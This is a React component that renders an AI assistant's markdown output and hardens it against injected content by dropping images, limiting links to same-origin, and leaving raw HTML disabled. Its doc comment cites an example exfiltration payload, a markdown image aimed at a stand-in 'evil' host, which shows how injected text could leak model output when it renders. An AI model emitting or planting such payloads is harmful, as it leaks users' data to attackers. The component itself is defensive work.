import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { Link } from 'react-router-dom';

/**
 * Renders assistant output.
 *
 * The component overrides below are security controls, not styling choices.
 * Assistant output can echo text authored by contractors — document titles,
 * review comments — so it is treated as untrusted markup:
 *
 *  - Images are dropped entirely. An injected `![](https://evil/?d=...)` would
 *    exfiltrate whatever the model had just written, on render, with no click
 *    required. This is the single most important line in the widget.
 *  - Links are followed only when same-origin; anything else renders as plain
 *    text so a malicious URL cannot be presented as a friendly label.
 *  - rehype-raw is deliberately NOT installed. react-markdown escapes raw HTML
 *    by default and adding it back would hand model output an XSS primitive.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <div className="text-sm leading-relaxed text-gray-800 space-y-2">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          img: () => null,

          a: ({ href, children: label }) => {
            const internal = typeof href === 'string' && /^\/(?!\/)/.test(href);
            if (!internal) return <span>{label}</span>;
            return (
              <Link to={href} className="text-primary-600 underline hover:text-primary-700">
                {label}
              </Link>
            );
          },

          p: ({ children }) => <p className="whitespace-pre-wrap">{children}</p>,
          h1: ({ children }) => <h3 className="text-sm font-semibold text-gray-900">{children}</h3>,
          h2: ({ children }) => <h3 className="text-sm font-semibold text-gray-900">{children}</h3>,
          h3: ({ children }) => <h4 className="text-sm font-semibold text-gray-800">{children}</h4>,
          ul: ({ children }) => <ul className="list-disc pl-5 space-y-0.5">{children}</ul>,
          ol: ({ children }) => <ol className="list-decimal pl-5 space-y-0.5">{children}</ol>,
          strong: ({ children }) => <strong className="font-semibold text-gray-900">{children}</strong>,
          code: ({ children }) => (
            <code className="rounded bg-gray-100 px-1 py-0.5 font-mono text-[12px] text-gray-800">
              {children}
            </code>
          ),
          pre: ({ children }) => (
            <pre className="overflow-x-auto rounded bg-gray-900 p-3 text-[12px] text-gray-100">
              {children}
            </pre>
          ),
          table: ({ children }) => (
            <div className="overflow-x-auto">
              <table className="w-full border-collapse text-xs">{children}</table>
            </div>
          ),
          th: ({ children }) => (
            <th className="border border-gray-200 bg-gray-50 px-2 py-1 text-left font-semibold">
              {children}
            </th>
          ),
          td: ({ children }) => <td className="border border-gray-200 px-2 py-1 align-top">{children}</td>,
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
